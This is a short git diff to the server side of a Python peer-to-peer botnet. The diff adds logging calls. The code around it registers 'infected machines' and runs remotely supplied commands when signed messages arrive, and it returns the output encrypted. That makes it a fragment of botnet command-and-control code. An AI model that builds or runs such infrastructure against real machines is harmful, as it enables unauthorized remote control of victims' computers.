@@ -1,9 +1,12 @@
 """Server side of the p2p communication protocol"""
 
+import logging
 import threading
 
 from botnet_p2p.comm_utils import NodeP2P
 from botnet_p2p.operations import add_new_infected_machine, execute_command
+
+logging.basicConfig(level=logging.DEBUG)
 
 
 NEW_NODE = 0
@@ -17,6 +20,7 @@ SERVER_PORT = 50000
 MAX_QUEUE = 4
     
 
+logging.info("Starting server ...")
 server_socket = NodeP2P()
 server_socket.bind(SERVER_HOST, SERVER_PORT)
 server_socket.listen(MAX_QUEUE)
@@ -34,17 +38,19 @@ def talk_with_client(client_socket: NodeP2P) -> None:
         Args:
             client_socket: Socket used to talk with the client
     """
+    logging.info("Receiving new message ...")
     msg_type, msg, trusted = client_socket.recv_signed_msg()
 
     if not msg_requires_to_be_signed(msg_type):
         add_new_infected_machine(msg)
     else:
         if trusted:
+            logging.info("The message is trusted")
             if msg_type == COMMAND:
                 output = execute_command(msg)
                 client_socket.send_encrypted_msg(output)
         else:
-            print("Someone is trying to break in")
+            logging.info("Someone is trying to break in")
 
 
 def msg_requires_to_be_signed(msg_type: int) -> bool:
